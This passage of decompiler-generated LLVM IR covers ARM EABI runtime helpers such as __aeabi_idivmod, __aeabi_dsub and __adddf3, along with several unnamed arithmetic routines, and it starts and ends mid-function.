  %v7_1a1a4 = icmp eq i32 %v5_1a1ac, 4
  %v2_1a1a8 = xor i1 %v7_1a1a4, true
  %v3_1a1a8 = and i1 %v2_1a1a4, %v2_1a1a8
  br i1 %v3_1a1a8, label %bb111, label %bb112

bb111:                                            ; preds = %.thread21
  %v5_1a1a8 = add nsw i32 %v4_1a1a8, 3
  br label %bb112

bb112:                                            ; preds = %.thread21, %bb111
  %v4_1a1ac = phi i32 [ %v4_1a1a8, %.thread21 ], [ %v5_1a1a8, %bb111 ]
  %v2_1a1ac = xor i1 %v2_1a1a4, true
  %v3_1a1ac = or i1 %v7_1a1a4, %v2_1a1ac
  br i1 %v3_1a1ac, label %bb113, label %bb114

bb113:                                            ; preds = %bb112
  %v8_1a1ac = udiv i32 %v5_1a1ac, 2
  %v9_1a1ac = add i32 %v4_1a1ac, %v8_1a1ac
  br label %bb114

bb114:                                            ; preds = %bb112, %bb113
  %v1_1a1b4 = phi i32 [ %v4_1a1ac, %bb112 ], [ %v9_1a1ac, %bb113 ]
  %v1_1a1b0 = icmp slt i32 %v2_1a0ac, 0
  %v6_1a1b4 = lshr i32 %v0_1a1b4, %v1_1a1b4
  %v2_1a1b8 = sub i32 0, %v6_1a1b4
  %v2_1a1b8.v6_1a1b4 = select i1 %v1_1a1b0, i32 %v2_1a1b8, i32 %v6_1a1b4
  ret i32 %v2_1a1b8.v6_1a1b4

dec_label_pc_1a1c0:                               ; preds = %entry
  %v0_1a1c4 = call i32 @__div0()
  ret i32 0

; uselistorder directives
  uselistorder i32 %v4_1a1ac, { 1, 0 }
  uselistorder i1 %v7_1a1a4, { 1, 0 }
  uselistorder i32 %v4_1a19c, { 1, 0 }
  uselistorder i32 %v1_1a19c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a190, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0, 2 }
  uselistorder i32 %v1_1a190, { 1, 0, 2, 3 }
  uselistorder i32 %v4_1a180, { 1, 0 }
  uselistorder i32 %v0_1a144, { 1, 0 }
  uselistorder i32 %v4_1a138, { 1, 0 }
  uselistorder i32 %v1_1a140, { 1, 2, 0 }
  uselistorder i32 %v4_1a12c, { 1, 0 }
  uselistorder i32 %v1_1a134, { 1, 2, 0 }
  uselistorder i32 %v4_1a120, { 1, 0 }
  uselistorder i32 %v1_1a128, { 1, 2, 0 }
  uselistorder i32 %v1_1a14c, { 0, 5, 1, 6, 2, 3, 4, 7, 8 }
  uselistorder i32 %v1_1a11c, { 1, 0 }
  uselistorder i32 %v1_1a148, { 1, 0, 2, 3, 4, 5 }
  uselistorder i32 %v3_1a108, { 1, 0 }
  uselistorder i32 %v3_1a104, { 1, 0 }
  uselistorder i32 %v1_1a104, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v2_1a100, { 1, 0 }
  uselistorder i32 %v1_1a108, { 1, 2, 0, 3 }
  uselistorder i32 %v4_1a0f4, { 1, 0 }
  uselistorder i32 %v4_1a0f0, { 2, 1, 0 }
  uselistorder i32 %v1_1a0f4, { 2, 1, 3, 0, 4 }
  uselistorder i32 %v0_1a0fc.pr40, { 1, 2, 0, 5, 4, 3 }
  uselistorder i1 %v3_1a0c8, { 1, 0 }
  uselistorder i32 %v1_1a180, { 5, 1, 6, 7, 3, 2, 0, 4, 8, 9, 10, 11 }
  uselistorder i32 %v2_1a0ac, { 1, 0, 2 }
  uselistorder i32 %v0_1a0a8, { 2, 1, 0, 4, 3 }
  uselistorder i32 ()* @__div0, { 1, 0 }
  uselistorder i32 %arg1, { 4, 5, 6, 3, 2, 1, 0 }
  uselistorder label %bb114, { 1, 0 }
  uselistorder label %bb112, { 1, 0 }
  uselistorder label %.thread21, { 2, 0, 1 }
  uselistorder label %.thread20, { 2, 0, 1 }
  uselistorder label %bb106, { 1, 0 }
  uselistorder label %bb103, { 1, 0 }
  uselistorder label %.thread16, { 0, 1, 2, 3, 5, 4 }
  uselistorder label %dec_label_pc_1a154, { 1, 0 }
  uselistorder label %thread-pre-split12, { 0, 2, 1 }
  uselistorder label %.thread10, { 2, 0, 1 }
  uselistorder label %.thread9, { 2, 0, 1 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %dec_label_pc_1a110, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1a0fcthread-pre-split, { 1, 0 }
  uselistorder label %.preheader, { 1, 0 }
  uselistorder label %.preheader.preheader, { 1, 0 }
  uselistorder label %bb86, { 1, 0 }
  uselistorder label %thread-pre-split, { 1, 0 }
}

define i32 @__aeabi_idivmod(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v2_1a1d8 = sdiv i32 %arg1, %arg2
  ret i32 %v2_1a1d8
}

define i32 @__aeabi_drsub(double %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = sext i32 %arg3 to i64
  %v8_1a1f0 = bitcast i64 %tmp to double
  %v9_1a1f0 = fadd double %v8_1a1f0, %arg1
  %v10_1a1f0 = fptrunc double %v9_1a1f0 to float
  %v11_1a1f0 = bitcast float %v10_1a1f0 to i32
  ret i32 %v11_1a1f0
}

define i32 @__aeabi_dsub(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v2_1a1f4 = load i32, i32* @r0, align 4
  ret i32 %v2_1a1f4
}

define i32 @__adddf3(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_1a1f8 = load i32, i32* @r4, align 4
  store i32 %v3_1a1f8, i32* %stack_var_-12, align 4
  %v6_1a1f8 = load i32, i32* @r5, align 4
  %v9_1a1f8 = load i32, i32* @lr, align 4
  %v0_1a1fc = load i32, i32* %r1.global-to-local, align 4
  %v2_1a1fc = mul i32 %v0_1a1fc, 2
  store i32 %v2_1a1fc, i32* %r4.global-to-local, align 4
  %v0_1a200 = load i32, i32* %r3.global-to-local, align 4
  %v2_1a200 = mul i32 %v0_1a200, 2
  store i32 %v2_1a200, i32* %r5.global-to-local, align 4
  %v4_1a204 = icmp eq i32 %v2_1a200, %v2_1a1fc
  %v1_1a208 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v4_1a204, label %bb, label %.thread

bb:                                               ; preds = %entry
  %v2_1a208 = load i32, i32* %r2.global-to-local, align 4
  %v5_1a208 = icmp eq i32 %v2_1a208, %v1_1a208
  br i1 %v5_1a208, label %.thread3, label %.thread

.thread:                                          ; preds = %entry, %bb
  %v3_1a20c = or i32 %v1_1a208, %v2_1a1fc
  %v5_1a20c = icmp eq i32 %v3_1a20c, 0
  br i1 %v5_1a20c, label %.thread3, label %bb10

bb10:                                             ; preds = %.thread
  %v2_1a210 = load i32, i32* %r2.global-to-local, align 4
  %v3_1a210 = or i32 %v2_1a210, %v2_1a200
  %v5_1a210 = icmp eq i32 %v3_1a210, 0
  br i1 %v5_1a210, label %.thread3, label %bb11

bb11:                                             ; preds = %bb10
  %v2_1a1fc.off = add i32 %v2_1a1fc, 4194303
  %tmp = icmp ult i32 %v2_1a1fc.off, 2097152
  br i1 %tmp, label %.thread3, label %bb12

bb12:                                             ; preds = %bb11
  %v2_1a200.off = add i32 %v2_1a200, 4194303
  %tmp17 = icmp ult i32 %v2_1a200.off, 2097152
  br label %.thread3

.thread3:                                         ; preds = %.thread, %bb, %bb10, %bb11, %bb12
  %v0_1a21c = phi i1 [ true, %bb10 ], [ true, %bb11 ], [ %tmp17, %bb12 ], [ true, %bb ], [ true, %.thread ]
  call void @__pseudo_cond_branch(i1 %v0_1a21c, i32 ptrtoint (i32* @global_var_1a454.690 to i32))
  %v0_1a220 = load i32, i32* %r4.global-to-local, align 4
  %v3_1a220 = udiv i32 %v0_1a220, 2097152
  store i32 %v3_1a220, i32* %r4.global-to-local, align 4
  %v1_1a224 = load i32, i32* %r5.global-to-local, align 4
  %v4_1a224 = udiv i32 %v1_1a224, 2097152
  %v5_1a224 = sub nsw i32 %v4_1a224, %v3_1a220
  %v5_1a228 = icmp ult i32 %v4_1a224, %v3_1a220
  br i1 %v5_1a228, label %bb13, label %bb14

bb13:                                             ; preds = %.thread3
  %v7_1a228 = sub nsw i32 0, %v5_1a224
  br label %bb14

bb14:                                             ; preds = %.thread3, %bb13
  %storemerge = phi i32 [ %v7_1a228, %bb13 ], [ %v5_1a224, %.thread3 ]
  %v0_1a24c = phi i32 [ %v7_1a228, %bb13 ], [ %v5_1a224, %.thread3 ]
  store i32 %storemerge, i32* %r5.global-to-local, align 4
  %v7_1a22c = icmp ugt i32 %v4_1a224, %v3_1a220
  br i1 %v7_1a22c, label %dec_label_pc_1a230, label %dec_label_pc_1a24c

dec_label_pc_1a230:                               ; preds = %bb14
  %v2_1a230 = add nsw i32 %v0_1a24c, %v3_1a220
  store i32 %v2_1a230, i32* %r4.global-to-local, align 4
  %v0_1a234 = load i32, i32* %r0.global-to-local, align 4
  %v1_1a234 = load i32, i32* %r2.global-to-local, align 4
  %v0_1a238 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a238 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v1_1a234, i32* %r0.global-to-local, align 4
  store i32 %v1_1a238, i32* %r1.global-to-local, align 4
  store i32 %v0_1a234, i32* %r2.global-to-local, align 4
  store i32 %v0_1a238, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a24c

dec_label_pc_1a24c:                               ; preds = %bb14, %dec_label_pc_1a230
  %tmp18 = icmp ugt i32 %v0_1a24c, 54
  br i1 %tmp18, label %bb15, label %bb16

bb15:                                             ; preds = %dec_label_pc_1a24c
  %v6_1a250 = load i32, i32* %stack_var_-12, align 4
  store i32 %v6_1a250, i32* %r4.global-to-local, align 4
  store i32 %v6_1a1f8, i32* %r5.global-to-local, align 4
  br label %bb16

bb16:                                             ; preds = %dec_label_pc_1a24c, %bb15
  call void @__pseudo_cond_branch(i1 %tmp18, i32 %v9_1a1f8)
  %v0_1a258 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a258 = icmp sgt i32 %v0_1a258, -1
  %v4_1a264 = urem i32 %v0_1a258, 1048576
  %v5_1a264 = or i32 %v4_1a264, 1048576
  store i32 %v5_1a264, i32* %r1.global-to-local, align 4
  br i1 %v3_1a258, label %dec_label_pc_1a274, label %dec_label_pc_1a26c

dec_label_pc_1a26c:                               ; preds = %bb16
  %v0_1a26c = load i32, i32* %r0.global-to-local, align 4
  %v1_1a26c = sub i32 0, %v0_1a26c
  store i32 %v1_1a26c, i32* %r0.global-to-local, align 4
  %v2_1a26c = icmp eq i32 %v0_1a26c, 0
  %v2_1a270 = icmp eq i1 %v2_1a26c, false
  %v5_1a270 = sext i1 %v2_1a270 to i32
  %v6_1a270 = sub nsw i32 %v5_1a270, %v5_1a264
  store i32 %v6_1a270, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1a274

dec_label_pc_1a274:                               ; preds = %bb16, %dec_label_pc_1a26c
  %v0_1a274 = load i32, i32* %r3.global-to-local, align 4
  %v3_1a274 = icmp sgt i32 %v0_1a274, -1
  %v4_1a27c = urem i32 %v0_1a274, 1048576
  %v5_1a27c = or i32 %v4_1a27c, 1048576
  store i32 %v5_1a27c, i32* %r3.global-to-local, align 4
  br i1 %v3_1a274, label %dec_label_pc_1a28c, label %dec_label_pc_1a284

dec_label_pc_1a284:                               ; preds = %dec_label_pc_1a274
  %v0_1a284 = load i32, i32* %r2.global-to-local, align 4
  %v1_1a284 = sub i32 0, %v0_1a284
  store i32 %v1_1a284, i32* %r2.global-to-local, align 4
  %v2_1a284 = icmp eq i32 %v0_1a284, 0
  %v2_1a288 = icmp eq i1 %v2_1a284, false
  %v5_1a288 = sext i1 %v2_1a288 to i32
  %v6_1a288 = sub nsw i32 %v5_1a288, %v5_1a27c
  store i32 %v6_1a288, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1a28c

dec_label_pc_1a28c:                               ; preds = %dec_label_pc_1a274, %dec_label_pc_1a284
  %v0_1a28c = load i32, i32* %r4.global-to-local, align 4
  %v1_1a28c = load i32, i32* %r5.global-to-local, align 4
  %v4_1a28c = icmp eq i32 %v1_1a28c, %v0_1a28c
  call void @__pseudo_cond_branch(i1 %v4_1a28c, i32 ptrtoint (i32* @global_var_1a43c.691 to i32))
  %v1_1a290 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_1a290

; uselistorder directives
  uselistorder i32 %v0_1a274, { 1, 0 }
  uselistorder i32 %v0_1a258, { 1, 0 }
  uselistorder i1 %tmp18, { 1, 0 }
  uselistorder i32 %v4_1a224, { 2, 1, 0 }
  uselistorder i32 %v3_1a220, { 4, 3, 2, 1, 0 }
  uselistorder i32 %v1_1a208, { 1, 0 }
  uselistorder i32 %v2_1a200, { 1, 3, 0, 2 }
  uselistorder i32 %v2_1a1fc, { 1, 3, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 1, 0, 3, 4 }
  uselistorder i32* %r4.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r2.global-to-local, { 4, 5, 6, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 3, 4, 5, 6, 0, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 4, 3, 5, 6, 0, 1, 2 }
  uselistorder label %dec_label_pc_1a28c, { 1, 0 }
  uselistorder label %dec_label_pc_1a274, { 1, 0 }
  uselistorder label %bb16, { 1, 0 }
  uselistorder label %dec_label_pc_1a24c, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %.thread3, { 4, 3, 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_1a294() local_unnamed_addr {
dec_label_pc_1a294:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %v0_1a294 = load i32, i32* @r4, align 4
  %v1_1a294 = add i32 %v0_1a294, -1
  store i32 %v1_1a294, i32* @r4, align 4
  %v0_1a298 = load i32, i32* @r5, align 4
  %v1_1a298 = sub i32 32, %v0_1a298
  store i32 %v1_1a298, i32* @lr, align 4
  %v5_1a29c = icmp sgt i32 %v0_1a298, 32
  br i1 %v5_1a29c, label %dec_label_pc_1a2b8, label %dec_label_pc_1a2a0

dec_label_pc_1a2a0:                               ; preds = %dec_label_pc_1a294
  %v0_1a2a0 = load i32, i32* @r2, align 4
  %v6_1a2a0 = shl i32 %v0_1a2a0, %v1_1a298
  store i32 %v6_1a2a0, i32* %ip.global-to-local, align 4
  %v0_1a2a4 = load i32, i32* @r0, align 4
  %v3_1a2a4 = add i32 %v0_1a298, -1
  %v4_1a2a4 = shl i32 1, %v3_1a2a4
  %v7_1a2a4 = lshr i32 %v0_1a2a0, %v0_1a298
  %v8_1a2a4 = add i32 %v0_1a2a4, %v7_1a2a4
  %v9_1a2a4 = icmp ult i32 %v8_1a2a4, %v0_1a2a4
  %v0_1a2a8 = load i32, i32* @r1, align 4
  %v2_1a2a8 = zext i1 %v9_1a2a4 to i32
  %v3_1a2a8 = add i32 %v2_1a2a8, %v0_1a2a8
  %v1_1a2ac = load i32, i32* @r3, align 4
  %v7_1a2ac = shl i32 %v1_1a2ac, %v1_1a298
  %v8_1a2ac = add i32 %v7_1a2ac, %v8_1a2a4
  store i32 %v8_1a2ac, i32* %r0.global-to-local, align 4
  %v5_1a2b0 = and i32 %v1_1a2ac, %v4_1a2a4
  %v6_1a2b0 = icmp ne i32 %v5_1a2b0, 0
  %v7_1a2b0 = ashr i32 %v1_1a2ac, %v0_1a298
  %v9_1a2b0 = add i32 %v3_1a2a8, %v7_1a2b0
  %v10_1a2b0 = zext i1 %v6_1a2b0 to i32
  %v11_1a2b0 = add i32 %v10_1a2b0, %v9_1a2b0
  br label %dec_label_pc_1a2d4

dec_label_pc_1a2b8:                               ; preds = %dec_label_pc_1a294
  %v1_1a2b8 = add i32 %v0_1a298, -32
  %v1_1a2bc = add i32 %v1_1a298, 32
  store i32 %v1_1a2bc, i32* @lr, align 4
  %v0_1a2c4 = load i32, i32* @r3, align 4
  %v2_1a2c4 = add i32 %v1_1a298, 31
  %v3_1a2c4 = lshr i32 -2147483648, %v2_1a2c4
  %v4_1a2c4 = and i32 %v0_1a2c4, %v3_1a2c4
  %v5_1a2c4 = icmp ne i32 %v4_1a2c4, 0
  %v6_1a2c4 = shl i32 %v0_1a2c4, %v1_1a2bc
  %v2_1a2c8 = or i32 %v6_1a2c4, 2
  %v2_1a2c8.v6_1a2c4 = select i1 %v5_1a2c4, i32 %v2_1a2c8, i32 %v6_1a2c4
  store i32 %v2_1a2c8.v6_1a2c4, i32* %ip.global-to-local, align 4
  %v0_1a2cc = load i32, i32* @r0, align 4
  %v7_1a2cc = ashr i32 %v0_1a2c4, %v1_1a2b8
  %v8_1a2cc = add i32 %v0_1a2cc, %v7_1a2cc
  store i32 %v8_1a2cc, i32* %r0.global-to-local, align 4
  %v0_1a2d0 = load i32, i32* @r1, align 4
  %v2_1a2d0 = and i32 %v0_1a2c4, 1073741824
  %v3_1a2d0 = icmp ne i32 %v2_1a2d0, 0
  %v4_1a2d0 = ashr i32 %v0_1a2c4, 31
  %v6_1a2d0 = add i32 %v0_1a2d0, %v4_1a2d0
  %v7_1a2d0 = zext i1 %v3_1a2d0 to i32
  %v8_1a2d0 = add i32 %v6_1a2d0, %v7_1a2d0
  br label %dec_label_pc_1a2d4

dec_label_pc_1a2d4:                               ; preds = %dec_label_pc_1a2a0, %dec_label_pc_1a2b8
  %storemerge = phi i32 [ %v11_1a2b0, %dec_label_pc_1a2a0 ], [ %v8_1a2d0, %dec_label_pc_1a2b8 ]
  %v0_1a2d4 = phi i32 [ %v11_1a2b0, %dec_label_pc_1a2a0 ], [ %v8_1a2d0, %dec_label_pc_1a2b8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_1a2d4 = and i32 %v0_1a2d4, -2147483648
  store i32 %v1_1a2d4, i32* @r5, align 4
  %v1_1a2d8 = icmp sgt i32 %v0_1a2d4, -1
  call void @__pseudo_cond_branch(i1 %v1_1a2d8, i32 ptrtoint (i32* @global_var_1a2e8.692 to i32))
  %v0_1a2dc = load i32, i32* %ip.global-to-local, align 4
  %v1_1a2dc = sub i32 0, %v0_1a2dc
  store i32 %v1_1a2dc, i32* %ip.global-to-local, align 4
  %v2_1a2dc = icmp eq i32 %v0_1a2dc, 0
  %v0_1a2e0 = load i32, i32* %r0.global-to-local, align 4
  %v2_1a2e0 = icmp eq i1 %v2_1a2dc, false
  %v5_1a2e0 = sext i1 %v2_1a2e0 to i32
  %v6_1a2e0 = sub i32 %v5_1a2e0, %v0_1a2e0
  store i32 %v6_1a2e0, i32* %r0.global-to-local, align 4
  %v7_1a2e0 = zext i1 %v2_1a2e0 to i32
  %v8_1a2e0 = icmp ne i32 %v6_1a2e0, %v7_1a2e0
  %v9_1a2e0 = icmp ne i32 %v0_1a2e0, -1
  %v10_1a2e0 = or i1 %v9_1a2e0, %v8_1a2e0
  %v11_1a2e0 = icmp ne i32 %v0_1a2e0, 0
  %v12_1a2e0 = select i1 %v2_1a2e0, i1 %v10_1a2e0, i1 %v11_1a2e0
  %v0_1a2e4 = load i32, i32* %r1.global-to-local, align 4
  %v5_1a2e4 = sext i1 %v12_1a2e0 to i32
  %v6_1a2e4 = sub i32 %v5_1a2e4, %v0_1a2e4
  store i32 %v6_1a2e4, i32* @r1, align 4
  ret i32 %v6_1a2e0

; uselistorder directives
  uselistorder i1 %v2_1a2e0, { 1, 2, 0 }
  uselistorder i32 %v0_1a2e0, { 1, 2, 0 }
  uselistorder i32 %v8_1a2d0, { 1, 0 }
  uselistorder i32 %v0_1a2c4, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_1a2b0, { 1, 0 }
  uselistorder i32 %v1_1a2ac, { 1, 0, 2 }
  uselistorder i32 %v0_1a2a4, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 1, 2, 0, 3 }
  uselistorder label %dec_label_pc_1a2d4, { 1, 0 }
}

define i32 @function_1a2e8(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1a2e8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_1a2e8 = load i32, i32* %r1.global-to-local, align 4
  %v3_1a2ec = icmp ult i32 %v0_1a2e8, 1048574
  br i1 %v3_1a2ec, label %dec_label_pc_1a330, label %dec_label_pc_1a2f0

dec_label_pc_1a2f0:                               ; preds = %dec_label_pc_1a2e8
  %v3_1a2f4 = icmp ult i32 %v0_1a2e8, 2097150
  br i1 %v3_1a2f4, label %dec_label_pc_1a314, label %dec_label_pc_1a2f8

dec_label_pc_1a2f8:                               ; preds = %dec_label_pc_1a2f0
  %v1_1a2f8 = urem i32 %v0_1a2e8, 2
  %v2_1a2f8 = icmp ne i32 %v1_1a2f8, 0
  %v3_1a2f8 = udiv i32 %v0_1a2e8, 2
  store i32 %v3_1a2f8, i32* %r1.global-to-local, align 4
  %v0_1a2fc = load i32, i32* %r0.global-to-local, align 4
  %v3_1a2fc = zext i1 %v2_1a2f8 to i32
  %v6_1a2fc = zext i32 %v0_1a2fc to i64
  %v7_1a2fc = sub i32 33, %v0_1a2fc
  %v8_1a2fc = zext i32 %v7_1a2fc to i64
  %v9_1a2fc = shl i64 %v6_1a2fc, %v8_1a2fc
  %v10_1a2fc = sub i32 32, %v0_1a2fc
  %v11_1a2fc = shl i32 %v3_1a2fc, %v10_1a2fc
  %v12_1a2fc = zext i32 %v11_1a2fc to i64
  %v14_1a2fc = or i64 %v12_1a2fc, %v9_1a2fc
  %v15_1a2fc = trunc i64 %v14_1a2fc to i32
  %v16_1a2fc = add i32 %v0_1a2fc, -1
  %v17_1a2fc = shl i32 1, %v16_1a2fc
  %v18_1a2fc = and i32 %v17_1a2fc, %v0_1a2fc
  %v19_1a2fc = icmp ne i32 %v18_1a2fc, 0
  store i32 %v15_1a2fc, i32* %r0.global-to-local, align 4
  %v0_1a300 = load i32, i32* @ip, align 4
  %v3_1a300 = zext i1 %v19_1a2fc to i32
  %v6_1a300 = zext i32 %v0_1a300 to i64
  %v7_1a300 = sub i32 33, %v0_1a300
  %v8_1a300 = zext i32 %v7_1a300 to i64
  %v9_1a300 = shl i64 %v6_1a300, %v8_1a300
  %v10_1a300 = sub i32 32, %v0_1a300
  %v11_1a300 = shl i32 %v3_1a300, %v10_1a300
  %v12_1a300 = zext i32 %v11_1a300 to i64
  %v14_1a300 = or i64 %v12_1a300, %v9_1a300
  %v15_1a300 = trunc i64 %v14_1a300 to i32
  store i32 %v15_1a300, i32* @ip, align 4
  %v0_1a304 = load i32, i32* @r4, align 4
  %v1_1a304 = add i32 %v0_1a304, 1
  store i32 %v1_1a304, i32* @r4, align 4
  %v3_1a308 = mul i32 %v1_1a304, 2097152
  %v2_1a30c = icmp ugt i32 %v3_1a308, -4194305
  call void @__pseudo_cond_branch(i1 %v2_1a30c, i32 ptrtoint (i32* @global_var_1a4c4.693 to i32))
  br label %dec_label_pc_1a314

dec_label_pc_1a314:                               ; preds = %dec_label_pc_1a330, %dec_label_pc_1a2f0, %dec_label_pc_1a2f8
  %v0_1a314 = load i32, i32* @ip, align 4
  %v2_1a314 = icmp slt i32 %v0_1a314, 0
  %v6_1a314 = icmp eq i32 %v0_1a314, -2147483648
  %v1_1a318 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_1a314, label %bb, label %dec_label_pc_1a314._crit_edge

bb:                                               ; preds = %dec_label_pc_1a314
  %v2_1a318 = urem i32 %v1_1a318, 2
  %v3_1a318 = icmp ne i32 %v2_1a318, 0
  br label %dec_label_pc_1a314._crit_edge

dec_label_pc_1a314._crit_edge:                    ; preds = %dec_label_pc_1a314, %bb
  %v1_1a31c = phi i1 [ %v3_1a318, %bb ], [ %v2_1a314, %dec_label_pc_1a314 ]
  %v2_1a31c = zext i1 %v1_1a31c to i32
  %v3_1a31c = add i32 %v2_1a31c, %v1_1a318
  store i32 %v3_1a31c, i32* %r0.global-to-local, align 4
  %v0_1a320 = load i32, i32* %r1.global-to-local, align 4
  %v1_1a320 = load i32, i32* @r4, align 4
  %v2_1a320 = and i32 %v1_1a320, 4096
  %v3_1a320 = icmp ne i32 %v2_1a320, 0
  %v4_1a320 = mul i32 %v1_1a320, 1048576
  %v6_1a320 = add i32 %v4_1a320, %v0_1a320
  %v7_1a320 = zext i1 %v3_1a320 to i32
  %v8_1a320 = add i32 %v7_1a320, %v6_1a320
  %v1_1a324 = load i32, i32* @r5, align 4
  %v2_1a324 = or i32 %v1_1a324, %v8_1a320
  store i32 %v2_1a324, i32* %r1.global-to-local, align 4
  ret i32 %v3_1a31c

dec_label_pc_1a330:                               ; preds = %dec_label_pc_1a2e8
  %v0_1a330 = load i32, i32* @ip, align 4
  %v1_1a330 = icmp slt i32 %v0_1a330, 0
  %v2_1a330 = mul i32 %v0_1a330, 2
  store i32 %v2_1a330, i32* @ip, align 4
  %v0_1a334 = load i32, i32* %r0.global-to-local, align 4
  %v3_1a334 = mul i32 %v0_1a334, 2
  %v4_1a334 = zext i1 %v1_1a330 to i32
  %v5_1a334 = or i32 %v3_1a334, %v4_1a334
  store i32 %v5_1a334, i32* %r0.global-to-local, align 4
  %v9_1a334 = icmp ule i32 %v5_1a334, %v0_1a334
  %v10_1a334 = icmp ult i32 %v3_1a334, %v0_1a334
  %v11_1a334 = select i1 %v1_1a330, i1 %v9_1a334, i1 %v10_1a334
  %v3_1a338 = mul i32 %v0_1a2e8, 2
  %v4_1a338 = zext i1 %v11_1a334 to i32
  %v5_1a338 = or i32 %v4_1a338, %v3_1a338
  store i32 %v5_1a338, i32* %r1.global-to-local, align 4
  %v1_1a33c = and i32 %v3_1a338, 1048576
  %v2_1a33c = icmp eq i32 %v1_1a33c, 0
  %v0_1a340 = load i32, i32* @r4, align 4
  %v1_1a340 = add i32 %v0_1a340, -1
  store i32 %v1_1a340, i32* @r4, align 4
  br i1 %v2_1a33c, label %bb7, label %dec_label_pc_1a314

bb7:                                              ; preds = %dec_label_pc_1a330
  ret i32 %v5_1a334

; uselistorder directives
  uselistorder i32 %v0_1a334, { 1, 2, 0 }
  uselistorder i1 %v1_1a330, { 1, 0 }
  uselistorder i32 %v1_1a318, { 1, 0 }
  uselistorder i32 %v0_1a314, { 1, 0 }
  uselistorder i32 %v0_1a300, { 1, 0, 2 }
  uselistorder i32 %v0_1a2fc, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_1a314._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_1a314, { 0, 2, 1 }
}

define i32 @function_1a348() local_unnamed_addr {
dec_label_pc_1a348:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_1a348 = load i32, i32* @r1, align 4
  %v2_1a348 = icmp eq i32 %v0_1a348, 0
  br i1 %v2_1a348, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_1a348
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_1a348
  %v1_1a35410 = load i32, i32* @r0, align 4
  store i32 %v1_1a35410, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_1a3b0 = phi i32 [ %v0_1a348, %bb ], [ %v1_1a35410, %bb38 ]
  %v1_1a368 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_1a360 = icmp ugt i32 %v0_1a3b0, 65535
  br i1 %v2_1a360, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_1a364 = and i32 %v0_1a3b0, 32768
  %v3_1a364 = icmp eq i32 %v2_1a364, 0
  %v4_1a364 = udiv i32 %v0_1a3b0, 65536
  br i1 %v3_1a364, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_1a368 = add nsw i32 %v1_1a368, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_1a374 = phi i32 [ %v1_1a368, %.thread ], [ %v1_1a368, %bb39 ], [ %v2_1a368, %bb40 ]
  %v1_1a370 = phi i32 [ %v0_1a3b0, %.thread ], [ %v4_1a364, %bb39 ], [ %v4_1a364, %bb40 ]
  %v2_1a36c = icmp ugt i32 %v1_1a370, 255
  br i1 %v2_1a36c, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_1a370 = and i32 %v1_1a370, 128
  %v3_1a370 = icmp eq i32 %v2_1a370, 0
  %v4_1a370 = udiv i32 %v1_1a370, 256
  br i1 %v3_1a370, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
